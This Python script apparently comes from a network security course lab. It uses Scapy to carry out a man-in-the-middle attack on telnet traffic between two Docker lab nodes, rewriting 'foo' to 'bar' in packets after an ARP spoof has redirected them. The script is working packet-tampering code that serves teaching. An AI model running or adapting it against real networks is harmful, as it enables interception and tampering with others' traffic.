#!/usr/bin/env python3

from scapy.all import *

# This program will intercept any data between the firewall node and the
# metasploit node, and change any occurence of 'foo' to 'bar'.  It requires
# that the host this is running on be intercepting traffic, such as via an
# ARP spoof.  It also requires that IP forwarding be disabled
# (set /proc/sys/net/ipv4/ip_forward to 0).

# The example this is used for, shown at 
# https://aaronbloomfield.github.io/nws/slides/link-layer.html#/mitmarp
# is telneting from the firewall node to the metasploit node.
#
# This code was adapted from code by Weiliang Du from
# https://www.handsonsecurity.net/files/slides/N02_MAC_ARP.pptx

# The host we are connecting from -- in our Docker setup, this is the firewall node
FIREWALL_IP = "192.168.100.1"
FIREWALL_MAC = "02:42:c0:a8:64:01"

# The machine we are telnetting to -- in our Docker setup, this is metasploit
VICTIM_IP = "192.168.100.3"
VICTIM_MAC = "02:42:c0:a8:64:03"

def spoof_pkt(pkt):

	# If the data is going from the victim node (metasploit) to the
	# originating node (firewall), we replace any instance of 'foo' with 'bar'
	if pkt[IP].src == VICTIM_IP and pkt[IP].dst == FIREWALL_IP:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load
			newdata = data.replace(b'foo',b'bar')
			if newdata != data:
				print("replaced")
			send(newpkt/newdata)
		else:
			send(newpkt)

	# If the data is going the other way -- from our originating node
	# (firewall) to the node being telnetted to (metasploit), we do not
	# modify the packets.
	elif pkt[IP].src == FIREWALL_IP or pkt[IP].dst == VICTIM_IP:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt)

filter = "tcp and (ether src " + FIREWALL_MAC + " or ether src " + VICTIM_MAC + ")"
pkt = sniff(iface='eth1', filter=filter, prn=spoof_pkt)
